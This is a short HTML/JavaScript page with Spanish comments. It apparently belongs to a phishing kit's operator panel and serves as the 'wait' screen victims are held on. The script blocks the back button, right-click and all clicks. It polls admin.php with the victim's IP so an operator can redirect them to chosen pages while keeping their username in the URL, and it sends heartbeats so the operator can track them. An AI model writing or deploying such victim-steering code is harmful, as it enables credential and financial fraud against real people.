<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
    // Anti-back
    (function(w){
        var h="!";var t=function(){if(w.location.hash!==h){w.location.hash=h}w.history.pushState(null,null,w.location.href);};
        w.onload=function(){t();};setInterval(function(){t();},300);
        w.onpopstate=function(){w.history.go(1);};
    })(window);

    $(function(){
        $(document).on("contextmenu",function(e){return false;});
        $('a, button, input').on('click focus',function(e){e.preventDefault();});
        setInterval(verificarEstado, 2000);
        iniciarHeartbeat();
    });

    // LOGICA DE REDIRECCIÓN (Conserva el usuario en la URL)
    async function verificarEstado(){
        try{
            const ip = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
            const urlParams = new URLSearchParams(window.location.search);
            const currentUser = urlParams.get('u') || '';

            const r = await fetch('admin.php',{
                method:'POST',
                headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:new URLSearchParams({action:'check_my_page',ip:ip})
            });
            
            if(r.ok){
                const d = await r.json();
                if(d.success && d.currentPage){
                    const destino = d.currentPage.split('/').pop().split('?')[0];
                    const actual = window.location.pathname.split('/').pop();
                    
                    if(destino !== 'wait.php' && destino !== actual && destino !== ''){
                        let nuevaRuta = d.currentPage;
                        if(currentUser !== '') {
                            if(nuevaRuta.indexOf('?') === -1) {
                                nuevaRuta += '?u=' + encodeURIComponent(currentUser);
                            } else {
                                nuevaRuta += '&u=' + encodeURIComponent(currentUser);
                            }
                        }
                        
                        window.location.href = nuevaRuta;
                        return;
                    }
                    
                    if(d.blocked || destino.includes('blocked')){
                        window.location.href = 'blocked.php';
                    }
                }
            }
        }catch(e){}
    }

    function iniciarHeartbeat(){
        const hb=()=>{
            $.post('admin.php',{action:'heartbeat',ip:'<?php echo $_SERVER['REMOTE_ADDR']; ?>'});
        };
        setInterval(hb,5000);
        hb();
    }
</script>
<script src="security.js"></script>
